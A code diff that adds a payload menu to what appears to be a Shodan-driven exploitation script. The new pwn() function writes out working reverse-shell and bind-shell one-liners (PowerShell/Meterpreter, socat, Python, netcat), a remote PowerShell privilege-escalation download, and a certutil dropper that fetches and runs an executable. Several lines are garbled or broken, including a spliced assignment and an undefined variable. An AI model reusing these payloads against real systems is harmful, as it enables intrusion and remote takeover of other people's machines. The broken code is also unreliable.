@@ -1,4 +1,6 @@
 import re
+import os
+import sys
 import json
 import time
 import urllib
@@ -98,7 +100,93 @@ def shodan_search(api_key, query):
     except Exception:
         return error_retval
 
+def pwn():
+	# Clear screen
+	if 'win32' in sys.platform:
+		os.system('cls')
+	else:
+		os.system('clear')
+	
+	# Payloads
+	selection = """\n
++----+-----+----+--------------------------+
+| ID | Platform |            Type          |
++----+----------+--------------------------+
+| 01 | Windows  | Reverse HTTP Meterpreter |
+| 02 | Windows  | Power-Up Priv Escalation |
+| 03 | Windows  | CertUtil Malware Dropper |
+| 04 |  *Nix    | Netcat Bind TCP Shell    |
+| 05 |  *Nix    | Socat Reverse Shell	   |
+| 06 |  *Nix    | Python Reverse TCP Shell |
++----+----------+--------------------------+
 
+Input Payload ID(Single Digit) or 'Q' to quit this menu.
+
+"""
+	print selection
+	try:
+		while True:
+			choice = raw_input("<INPUT> : ")
+			if choice == '1':
+				# Reverse HTTP Meterpreter
+		
+				LHOST   = raw_input("Please provide an LHOST for the Reverse Connection handler: ")
+				LPORT   = raw_input("Please provide an LPORT for the Reverse Connection handler: ")
+				payload = "Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost {0} -Lport {1} -Force".payload = "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{0}:{1}".format(LHOST, LPORT)
+		
+				print ("[+] Done. Reverse HTTP Meterpreter selected.")
+				return payload
+			elif choice == '2':
+				# Retrieve and execute PowerShell script aimed at privilege escalation
+			
+				print ("[+] Power-Up, Priv-Esc payload selected.")
+				return "Powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks"
+			elif choice == '3':
+				# Stager leveraging CertUtil
+		
+				print ("[!] Please provide the exact URL to your remote payload. In example;")
+				print ("http://staging-server.com/evil.exe\n")
+				URI = raw_input("<URL> : ")
+				payload = "certutil.exe -urlcache -split -f {0} google_https_cert.exe && google_https_cert.exe".format(URI)
+			
+				print ("[+] Done. CertUtil stager selected.")
+				return payload
+			elif choice == '4':
+				# Netcat Bind
+			
+				RPORT   = raw_input("Please provide the PORT you want Netcat to bind to: ")
+				payload = "nc -lvp {0} -e /bin/sh".format(PORT)
+			
+				print ("[+] Done, Netcat Bind selected.")
+				return payload
+			elif choice == '5':
+				# Socat based Reverse TCP Shell	
+				# Socat listener -> socat file:`tty`,raw,echo=0 tcp-listen:LPORT
+				LHOST   = raw_input("Please provide an LHOST for the Reverse Connection handler: ")
+				LPORT   = raw_input("Please provide an LPORT for the Reverse Connection handler: ")
+				payload = "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{0}:{1}".format(LHOST, LPORT)
+			
+				print ("[+] Done, Socat Reverse Shell selected.")
+				return payload
+			elif choice == '6':
+				# Python Reverse TCP Shell
+			
+				LHOST   = raw_input("Please provide an LHOST for the Reverse Connection handler: ")
+				LPORT   = raw_input("Please provide an LPORT for the Reverse Connection handler: ")
+				payload = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""".format(LHOST, LPORT)
+			
+				print ("[+] Done, Python Reverse Shell selected.")
+				return payload		
+			elif 'Q' or 'q' in choice:
+				print ("[!] Quitting menu.")
+				time.sleep(2)
+				break
+			else:
+				print ("[!] Unhandled Option.")
+				
+		except KeyboardInterrupt:
+			print("[!] User quit")	
+				
 def check_opts(opts):
     """
     check all the arguments and create a dict to use for the arguments
@@ -134,8 +222,20 @@ def check_opts(opts):
         print("[+] using provided query: '{}'".format(opts.searchQuery))
         retval["query"] = opts.searchQuery
     if opts.commandToExecute is None:
-        retval["command"] = "calc"
-    else:
+		
+		print("[!] No command was supplied. Select a pre-defined secondary payload?")
+		choice = raw_input("[Y]es/[No]: ").lower
+		
+		if choice == 'y':
+			retval["command"] = pwn()
+		elif choice == 'n':
+			print("[!] No payload was loaded.")
+			retval["command"] = "calc"
+		else:
+			print("[!] Unhandled option. No payload was loaded")
+			retval["command"] = "calc"
+		
+	else:
         print("[+] configuring command: '{}'".format(opts.commandToExecute))
         retval["command"] = opts.commandToExecute
     return retval
